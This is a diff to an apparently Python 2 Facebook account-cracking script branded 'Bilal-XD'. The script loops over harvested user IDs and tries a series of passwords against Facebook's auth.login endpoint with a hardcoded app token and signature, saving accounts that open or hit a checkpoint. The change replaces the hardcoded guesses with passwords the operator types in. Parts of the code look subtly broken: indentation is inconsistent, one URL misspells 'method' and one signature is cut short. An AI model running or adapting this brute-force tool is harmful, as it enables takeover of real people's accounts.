@@ -278,6 +278,10 @@ def pilih_super():
 
 	
 	print "\033[0;39;40m[•] Total IDs : \033[0;97m"+str(len(id))
+	pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[1]Password: ')
+    pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[2]Password: ')
+    pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[3]Password: ')
+    pass8 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[4]Password: ')
 	jalan('\033[0;39;40m[•] Please Wait...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -352,7 +356,6 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = '102030'
 											data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -366,7 +369,6 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = '778899'
 													data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -380,7 +382,6 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = '445566'
 															data = urllib.urlopen("https://mbasic.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -394,7 +395,6 @@ def pilih_super():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
-																	pass8 = '223344'
 																	data = urllib.urlopen("https://mbasic.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
 																	q = json.load(data)
 																	if 'access_token' in q:
